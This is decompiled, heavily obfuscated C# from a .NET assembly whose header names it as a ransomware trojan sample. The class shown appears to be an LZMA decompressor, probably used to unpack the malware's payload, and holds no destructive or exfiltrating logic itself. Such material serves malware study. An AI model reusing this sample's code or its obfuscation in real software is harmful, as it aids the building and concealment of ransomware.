// Decompiled with JetBrains decompiler
// Type: 297045CE
// Assembly: Jpacuhx, Version=1.3.3.7, Culture=neutral, PublicKeyToken=null
// MVID: B7704B77-4DD4-48D4-97D0-5BA26F25BA72
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.04\HEUR-Trojan-Ransom.MSIL.Blocker.gen-d4baea4557d5696a6fa51e514e324238b32cea5cc9102b59d87c511f350d21d2.exe

using System;
using System.IO;

public class \u003297045CE
{
  private readonly \u003343341C9 \u0032D062773;
  private readonly \u0034E053688[] \u0030D990314;
  private readonly \u003321250D8 \u00372521F3C;
  private readonly \u0034E053688[] \u0032B8204D3;
  private readonly \u003297045CE.\u0037CEA7CE0 \u00318E36D56;
  private \u0030E3B40B0 \u0032C053211;
  private readonly \u0034E053688[] \u00337150A46;
  private readonly \u0034E053688[] \u00332EA3787;
  private readonly \u0030E3B40B0[] \u0033E8379C4;
  private readonly \u0034E053688[] \u0036B5430DB;
  private uint \u00345127FB5;
  private uint \u00338E8252D;
  private readonly \u0034E053688[] \u0035F322159;
  private readonly \u003297045CE.\u003506346AB \u003043131ED;
  private readonly \u003297045CE.\u0037CEA7CE0 \u0036F6046C6;
  private readonly \u0034E053688[] \u003264357EF;
  private uint \u0030EEF1095;
  private uint \u003379F1EC1;

  private void \u00346540801(Stream _param1, Stream _param2)
  {
    this.\u0032D062773.\u003042F7850(_param1);
    this.\u00372521F3C.\u003158A7C74(_param2, false);
    for (uint index1 = 0; index1 < 12U; ++index1)
    {
      for (uint index2 = 0; index2 <= this.\u00338E8252D; ++index2)
      {
        uint index3 = (index1 << 4) + index2;
        this.\u00337150A46[(int) index3].\u00334C2732A();
        this.\u0035F322159[(int) index3].\u00334C2732A();
      }
      this.\u0030D990314[(int) index1].\u00334C2732A();
      this.\u0032B8204D3[(int) index1].\u00334C2732A();
      this.\u003264357EF[(int) index1].\u00334C2732A();
      this.\u0036B5430DB[(int) index1].\u00334C2732A();
    }
    this.\u003043131ED.\u003402C381D();
    for (uint index = 0; index < 4U; ++index)
      this.\u0033E8379C4[(int) index].\u003558B2956();
    for (uint index = 0; index < 114U; ++index)
      this.\u00332EA3787[(int) index].\u00334C2732A();
    this.\u00318E36D56.\u0037B4364B2();
    this.\u0036F6046C6.\u0037B4364B2();
    this.\u0032C053211.\u003558B2956();
  }

  private void \u0035E0754FF(int _param1, int _param2)
  {
    if (_param1 > 8)
      throw new ArgumentException("lp > 8");
    if (_param2 > 8)
      throw new ArgumentException("lc > 8");
    this.\u003043131ED.\u00364357007(_param1, _param2);
  }

  public void \u003666C6ADA(byte[] _param1)
  {
    if (_param1.Length < 5)
      throw new ArgumentException("properties.Length < 5");
    int num1 = (int) _param1[0] % 9;
    int num2 = (int) _param1[0] / 9;
    int num3 = num2 % 5;
    int num4 = num2 / 5;
    if (num4 > 4)
      throw new ArgumentException("pb > Base.kNumPosStatesBitsMax");
    uint num5 = 0;
    for (int index = 0; index < 4; ++index)
      num5 += (uint) _param1[1 + index] << index * 8;
    this.\u003205C30A2(num5);
    this.\u0035E0754FF(num3, num1);
    this.\u00341E20A9F(num4);
  }

  private void \u003205C30A2(uint _param1)
  {
    if ((int) this.\u0030EEF1095 == (int) _param1)
      return;
    this.\u0030EEF1095 = _param1;
    this.\u00345127FB5 = Math.Max(this.\u0030EEF1095, 1U);
    this.\u00372521F3C.\u003215F21A7(Math.Max(this.\u00345127FB5, 4096U));
  }

  private void \u00341E20A9F(int _param1)
  {
    if (_param1 > 4)
      throw new ArgumentException("pb > Base.KNumPosStatesBitsMax");
    uint num = (uint) (1 << _param1);
    this.\u00318E36D56.\u00304232240(num);
    this.\u0036F6046C6.\u00304232240(num);
    this.\u00338E8252D = num - 1U;
  }

  public void \u00332E00AE2(Stream _param1, Stream _param2, long _param3)
  {
    this.\u00346540801(_param1, _param2);
    \u00310C75464.\u0036BCC1923 obj = new \u00310C75464.\u0036BCC1923();
    obj.\u003411E55E1();
    uint num1 = 0;
    uint num2 = 0;
    uint num3 = 0;
    uint num4 = 0;
    ulong num5 = 0;
    ulong num6 = (ulong) _param3;
    if (num5 < num6)
    {
      if (this.\u00337150A46[(int) obj.\u0036F94277C << 4].\u003587F2867(this.\u0032D062773) != 0U)
        throw new InvalidDataException("IsMatchDecoders");
      obj.\u0032C071771();
      this.\u00372521F3C.\u003274A0DC2(this.\u003043131ED.\u003604B0749(this.\u0032D062773, 0U, (byte) 0));
      ++num5;
    }
    while (num5 < num6)
    {
      uint num7 = (uint) num5 & this.\u00338E8252D;
      if (this.\u00337150A46[((int) obj.\u0036F94277C << 4) + (int) num7].\u003587F2867(this.\u0032D062773) == 0U)
      {
        byte num8 = this.\u00372521F3C.\u003241D31B5(0U);
        this.\u00372521F3C.\u003274A0DC2(obj.\u0034A6A4B28() ? this.\u003043131ED.\u003604B0749(this.\u0032D062773, (uint) num5, num8) : this.\u003043131ED.\u003638C59F3(this.\u0032D062773, (uint) num5, num8, this.\u00372521F3C.\u003241D31B5(num1)));
        obj.\u0032C071771();
        ++num5;
      }
      else
      {
        uint num9;
        if (this.\u0030D990314[(int) obj.\u0036F94277C].\u003587F2867(this.\u0032D062773) == 1U)
        {
          if (this.\u0032B8204D3[(int) obj.\u0036F94277C].\u003587F2867(this.\u0032D062773) == 0U)
          {
            if (this.\u0035F322159[((int) obj.\u0036F94277C << 4) + (int) num7].\u003587F2867(this.\u0032D062773) == 0U)
            {
              obj.\u0031B485439();
              this.\u00372521F3C.\u003274A0DC2(this.\u00372521F3C.\u003241D31B5(num1));
              ++num5;
              continue;
            }
          }
          else
          {
            uint num10;
            if (this.\u003264357EF[(int) obj.\u0036F94277C].\u003587F2867(this.\u0032D062773) == 0U)
            {
              num10 = num2;
            }
            else
            {
              if (this.\u0036B5430DB[(int) obj.\u0036F94277C].\u003587F2867(this.\u0032D062773) == 0U)
              {
                num10 = num3;
              }
              else
              {
                num10 = num4;
                num4 = num3;
              }
              num3 = num2;
            }
            num2 = num1;
            num1 = num10;
          }
          num9 = this.\u0036F6046C6.\u003561772AA(this.\u0032D062773, num7) + 2U;
          obj.\u0034CA916CD();
        }
        else
        {
          num4 = num3;
          num3 = num2;
          num2 = num1;
          num9 = 2U + this.\u00318E36D56.\u003561772AA(this.\u0032D062773, num7);
          obj.\u00312B3699E();
          uint num11 = this.\u0033E8379C4[(int) \u00310C75464.\u003409800CA(num9)].\u00322DD3E23(this.\u0032D062773);
          if (num11 >= 4U)
          {
            int num12 = (int) (num11 >> 1) - 1;
            uint num13 = (uint) ((2 | (int) num11 & 1) << num12);
            num1 = num11 >= 14U ? num13 + (this.\u0032D062773.\u003359151DA(num12 - 4) << 4) + this.\u0032C053211.\u00346763637(this.\u0032D062773) : num13 + \u0030E3B40B0.\u0032A7441EF(this.\u00332EA3787, (uint) ((int) num13 - (int) num11 - 1), this.\u0032D062773, num12);
          }
          else
            num1 = num11;
        }
        if ((ulong) num1 >= (ulong) this.\u00372521F3C.\u0032755329D + num5 || num1 >= this.\u00345127FB5)
        {
          if (num1 != uint.MaxValue)
            throw new InvalidDataException("rep0");
          break;
        }
        this.\u00372521F3C.\u00300B17A3C(num1, num9);
        num5 += (ulong) num9;
      }
    }
    this.\u00372521F3C.\u00369C8212F();
    this.\u00372521F3C.\u0031EDE6EBF();
    this.\u0032D062773.\u00347F95B14();
  }

  public \u003297045CE()
  {
    this.\u00372521F3C = new \u003321250D8();
    this.\u0032D062773 = new \u003343341C9();
    this.\u00337150A46 = new \u0034E053688[192];
    this.\u0030D990314 = new \u0034E053688[12];
    this.\u0032B8204D3 = new \u0034E053688[12];
    this.\u003264357EF = new \u0034E053688[12];
    this.\u0036B5430DB = new \u0034E053688[12];
    this.\u0035F322159 = new \u0034E053688[192];
    this.\u0033E8379C4 = new \u0030E3B40B0[4];
    this.\u00332EA3787 = new \u0034E053688[114];
    this.\u0032C053211 = new \u0030E3B40B0(4);
    this.\u00318E36D56 = new \u003297045CE.\u0037CEA7CE0();
    this.\u0036F6046C6 = new \u003297045CE.\u0037CEA7CE0();
    this.\u003043131ED = new \u003297045CE.\u003506346AB();
    // ISSUE: explicit constructor call
    base.\u002Ector();
    this.\u0030EEF1095 = uint.MaxValue;
    for (int index = 0; index < 4; ++index)
      this.\u0033E8379C4[index] = new \u0030E3B40B0(6);
  }

  private class \u0037CEA7CE0
  {
    private \u0034E053688 \u00301076E4C;
    private \u0030E3B40B0 \u0037FC02AD1;
    private readonly \u0030E3B40B0[] \u00309C61119;
    private uint \u00300760C92;
    private readonly \u0030E3B40B0[] \u0035B1752A7;
    private \u0034E053688 \u0034F8C4750;

    public uint \u003561772AA(\u003343341C9 _param1, uint _param2)
    {
      if (this.\u0034F8C4750.\u003587F2867(_param1) == 0U)
        return this.\u0035B1752A7[(int) _param2].\u00322DD3E23(_param1);
      uint num = 8;
      return this.\u00301076E4C.\u003587F2867(_param1) != 0U ? num + 8U + this.\u0037FC02AD1.\u00322DD3E23(_param1) : num + this.\u00309C61119[(int) _param2].\u00322DD3E23(_param1);
    }

    public \u0037CEA7CE0()
    {
      this.\u00309C61119 = new \u0030E3B40B0[16];
      this.\u0037FC02AD1 = new \u0030E3B40B0(8);
      // ISSUE: explicit constructor call
      base.\u002Ector();
    }

    public void \u0037B4364B2()
    {
      this.\u0034F8C4750.\u00334C2732A();
      for (uint index = 0; index < this.\u00300760C92; ++index)
      {
        this.\u0035B1752A7[(int) index].\u003558B2956();
        this.\u00309C61119[(int) index].\u003558B2956();
      }
      this.\u00301076E4C.\u00334C2732A();
      this.\u0037FC02AD1.\u003558B2956();
    }

    public void \u00304232240(uint _param1)
    {
      for (uint index = this.\u00300760C92; index < _param1; ++index)
      {
        this.\u0035B1752A7[(int) index] = new \u0030E3B40B0(3);
        this.\u00309C61119[(int) index] = new \u0030E3B40B0(3);
      }
      this.\u00300760C92 = _param1;
    }
  }

  private class \u003506346AB
  {
    private int \u003091D2B19;
    private int \u00326E60670;
    private \u003297045CE.\u003506346AB.\u00372117B12[] \u0034674242F;
    private uint \u00344973DC6;
    private uint \u0036D724D74 = 1;

    public byte \u003638C59F3(\u003343341C9 _param1, uint _param2, byte _param3, byte _param4) => this.\u0034674242F[(int) this.\u00323F07330(_param2, _param3)].\u00322B06E4B(_param1, _param4);

    public byte \u003604B0749(\u003343341C9 _param1, uint _param2, byte _param3) => this.\u0034674242F[(int) this.\u00323F07330(_param2, _param3)].\u00356982BC5(_param1);

    public void \u003402C381D()
    {
      uint num = (uint) (1 << this.\u003091D2B19 + this.\u00326E60670);
      for (uint index = 0; index < num; ++index)
        this.\u0034674242F[(int) index].\u003459D07FD();
    }

    private uint \u00323F07330(uint _param1, byte _param2) => (uint) ((((int) _param1 & (int) this.\u00344973DC6) << this.\u003091D2B19) + ((int) _param2 >> 8 - this.\u003091D2B19));

    public void \u00364357007(int _param1, int _param2)
    {
      if (this.\u0034674242F != null && this.\u003091D2B19 == _param2 && this.\u00326E60670 == _param1)
        return;
      this.\u00326E60670 = _param1;
      this.\u00344973DC6 = (uint) ((1 << _param1) - 1);
      this.\u003091D2B19 = _param2;
      uint length = (uint) (1 << this.\u003091D2B19 + this.\u00326E60670);
      this.\u0034674242F = new \u003297045CE.\u003506346AB.\u00372117B12[(int) length];
      for (uint index = 0; index < length; ++index)
        this.\u0034674242F[(int) index].\u0037F5421DA();
    }

    private struct \u00372117B12
    {
      private \u0034E053688[] \u0035C583496;

      public void \u003459D07FD()
      {
        for (int index = 0; index < 768; ++index)
          this.\u0035C583496[index].\u00334C2732A();
      }

      public byte \u00356982BC5(\u003343341C9 _param1)
      {
        uint index = 1;
        do
        {
          index = index << 1 | this.\u0035C583496[(int) index].\u003587F2867(_param1);
        }
        while (index < 256U);
        return (byte) index;
      }

      public byte \u00322B06E4B(\u003343341C9 _param1, byte _param2)
      {
        uint index = 1;
        do
        {
          uint num1 = (uint) ((int) _param2 >> 7 & 1);
          _param2 <<= 1;
          uint num2 = this.\u0035C583496[(1 + (int) num1 << 8) + (int) index].\u003587F2867(_param1);
          index = index << 1 | num2;
          if ((int) num1 != (int) num2)
          {
            while (index < 256U)
              index = index << 1 | this.\u0035C583496[(int) index].\u003587F2867(_param1);
            break;
          }
        }
        while (index < 256U);
        return (byte) index;
      }

      public void \u0037F5421DA() => this.\u0035C583496 = new \u0034E053688[768];
    }
  }
}
